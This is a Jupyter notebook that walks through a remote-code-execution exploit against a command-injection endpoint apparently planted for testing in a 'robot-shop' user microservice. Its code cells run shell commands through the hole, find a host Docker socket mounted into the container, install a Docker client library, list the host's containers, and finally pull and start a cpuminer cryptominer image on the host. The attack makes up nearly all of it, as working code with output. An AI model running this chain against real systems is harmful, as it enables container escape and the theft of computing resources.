{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# [RCE] robot-shop/rs-user"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Imports some dependencies to simplify exploit development.\n",
    "\n",
    "`requests` is packaged with CPython and offers a convenient interface for an\n",
    "HTTP client.\n",
    "\n",
    "`pwn` is a library for CTF hacking contests which provides useful functions for\n",
    "any kind of vulnerability exploitation.  We specifically want to use it for its\n",
    "implementation of *sh* escaping through the `sh_command_with` function."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import pwn"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We define an `exec(str)` function to simplify the logic of executing code on the\n",
    "remote machine.\n",
    "\n",
    "The vulnerability that was manually inserted into the source code is very\n",
    "obvious for testing purposes.  While a real vulnerability might not be as\n",
    "obvious, the ways to exploit it should remain approximately the same."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def exec(command: str) -> tuple[str, str]:\n",
    "    \"\"\"Executes the given command on the remote machine.\"\"\"\n",
    "    headers = {'Content-Type': 'text/plain'}\n",
    "    response = requests.post('http://localhost:8080/api/user/command-injection', headers=headers, data=command)\n",
    "    body = response.json()\n",
    "\n",
    "    if 'err' in body:\n",
    "        print(body)\n",
    "        raise Exception(body['err'])\n",
    "\n",
    "    return body['stdout'], body['stderr']"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can test it works by using it to print `Hello World!` to the terminal."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello World!\n",
      "\n"
     ]
    }
   ],
   "source": [
    "(stdout, _) = exec(\"echo Hello World!\")\n",
    "print(stdout)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In a real world situation, the attacker will probably know that we are running a\n",
    "*NodeJS* server from looking at the `Server` header in a typical response, or\n",
    "through the source code if the application is Open Source.\n",
    "\n",
    "We know that the microservice where the vulnerability is present is a `NodeJS`\n",
    "server."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can then check if `docker` is exposed and working:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('', '')\n",
      "('/host/var/run/docker.sock\\n', '')\n"
     ]
    }
   ],
   "source": [
    "for path in ['/var', '/host/var']:\n",
    "    print(exec(f\"find {pwn.sh_string(path)} -type f -name docker.sock\"))"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since we know that the container is an Alpine Linux environment, the Docker\n",
    "executable will not work correctly as it requires *glibc*, which is not\n",
    "installed."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'err': {'killed': False, 'code': 1, 'signal': None, 'cmd': 'sh -c /host/usr/bin/docker info'}, 'stdout': '', 'stderr': \"/host/usr/bin/docker: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /host/usr/bin/docker)\\n/host/usr/bin/docker: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /host/usr/bin/docker)\\n\"}\n",
      "{'killed': False, 'code': 1, 'signal': None, 'cmd': 'sh -c /host/usr/bin/docker info'}\n"
     ]
    }
   ],
   "source": [
    "try:\n",
    "    print(exec(\"/host/usr/bin/docker info\"))\n",
    "except Exception as e:\n",
    "    print(e)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We do however have access to *NodeJS*, and could therefore use a *NodeJS*\n",
    "implementation of a *Docker* client library."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+ dockerode@3.3.4\n",
      "updated 1 package and audited 208 packages in 3.149s\n",
      "\n",
      "9 packages are looking for funding\n",
      "  run `npm fund` for details\n",
      "\n",
      "found 1 high severity vulnerability\n",
      "  run `npm audit fix` to fix them, or `npm audit` for details\n",
      "\n"
     ]
    }
   ],
   "source": [
    "(stdout, _) = exec(\"npm install dockerode\")\n",
    "print(stdout)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can then confirm that we are able to issue queries and commands to *Docker*\n",
    "from inside *NodeJS*:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def exec_node(script: str) -> tuple[str, str]:\n",
    "    \"\"\"Executes a NodeJS script on the target machine.\"\"\"\n",
    "    command = pwn.sh_command_with(lambda script: f\"echo {script} | node --experimental-repl-await\", script)\n",
    "    return exec(command)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "vscode": {
     "languageId": "javascript"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting docker-list-containers.js\n"
     ]
    }
   ],
   "source": [
    "%%writefile docker-list-containers.js\n",
    "const Docker = require('dockerode')\n",
    "const docker = new Docker({ socketPath: '/host/var/run/docker.sock' })\n",
    "\n",
    "docker.listContainers()\n",
    "    .then(function (containers) {\n",
    "        for (container of containers) {\n",
    "            console.log(container.Id)\n",
    "        }\n",
    "    })\n",
    "    .catch(console.error)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "a8a04e5e5536c38133b85b468e597cd4626b2a132d1d023b41416f29bab4b2ad\n",
      "c3152282acb5e4372158c010cc9ca6301bf1068aee21b6128b470569c2eef5f0\n",
      "e05a4b7fadd26fbfde87c48e3fc0f438bca60b09bf9f79cb45f662a92b183bcd\n",
      "06df2219099ade1b489ffbc97df6019cd715225d467251ecdd8e7960fb4d97f9\n",
      "5a33dfe7b8421396ea5766e00eac954c6bceb003f99f93d9b80fdb5f49dce165\n",
      "e0f2d154be195005d03924a4d22e6e088bfda451c2ef0ec5ba58a0e2bec312e8\n",
      "fb246ee581c8029be63160d0ce063b60907494030907c2c8bfc7bee105e2816e\n",
      "5f6591b01291d8398b3f2e1d03e571f3c454fe88758e4ed98125709e10d95118\n",
      "118f3715857251e7890f0360548fb10e3dcb23287f1e206bd3f602f34a3b4da1\n",
      "74ef1fe9750af9938d73a11d52648330ae6a9a4c87c8e18e02b8fbebd8df24c4\n",
      "a5a3aba3f8fbfa450f23f452b6dcc33dcc8c65ce93f4ba04cd2a40262ed05855\n",
      "0444bda21bb21ad671acea584de2914e9587181a0b535bf0234c598fb8fbbb70\n",
      "\n"
     ]
    }
   ],
   "source": [
    "with open('./docker-list-containers.js') as file:\n",
    "    script = file.read()\n",
    "\n",
    "(stdout, _) = exec_node(script)\n",
    "print(stdout)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since we know we can query *Docker* through *NodeJS*, lets now create an image\n",
    "of *cpuminer*:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "vscode": {
     "languageId": "javascript"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting docker-create-cpuminer.js\n"
     ]
    }
   ],
   "source": [
    "%%writefile docker-create-cpuminer.js\n",
    "const Docker = require('dockerode')\n",
    "const docker = new Docker({ socketPath: '/host/var/run/docker.sock' })\n",
    "\n",
    ";(async function () {\n",
    "    await docker.pull('wernight/cpuminer-multi')   \n",
    "    const container = await docker.createContainer({Image: 'wernight/cpuminer-multi:latest'})\n",
    "    await container.start()\n",
    "}()).catch(console.error)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('', '')"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with open(\"./docker-create-cpuminer.js\") as file:\n",
    "    script = file.read()\n",
    "\n",
    "exec_node(script)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
